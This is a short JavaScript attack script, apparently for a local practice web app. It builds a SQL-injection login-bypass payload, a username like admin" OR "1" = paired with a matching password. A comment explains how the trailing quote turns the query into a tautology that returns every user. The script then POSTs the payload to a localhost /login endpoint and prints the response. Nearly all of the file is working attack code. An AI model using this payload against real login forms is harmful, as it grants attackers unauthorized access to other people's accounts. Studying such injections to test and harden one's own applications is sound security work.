function normalizePort(val) {
    var port = parseInt(val, 10);
    if (isNaN(port)) {
      // named pipe
      return val;
    }
    if (port >= 0) {
      return port;
    }
    return false;
}

/* payload for a login sql-injection targeting an unescaped formatted query target
 * 
 * args:
 *  either log in as a given user or try to log in as admin or the first user in the table
 *
 * user: admin" OR "1" = 
 * pw: OR "1" = "2
 * query: SELECT * FROM Users WHERE = "admin" OR "1" =" AND password = "OR "1" = "2"
 * 
 * Note, that instead of getting rid of the AND false disjunction by means of commenting it out,
 * it interprets this part as a string and adds another OR to fix the trailing quotation marks
 * error. Setting this conjunction to be True results in a tautology, yielding every user
 */
payload = (user) => {
    return {
        username: `${user || 'admin'}" OR "1" = `,
        password: `OR "1" = "${user ? 2 : 1}`
    }
};

(async () => {
    const port = normalizePort(process.env.PORT || '3000');
    const url = `http://localhost:${port}/login`;
    const init = {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload())
    };
    const rawResponse = await fetch(url, init);
    const content = await rawResponse.json();
    console.log(content);
})();
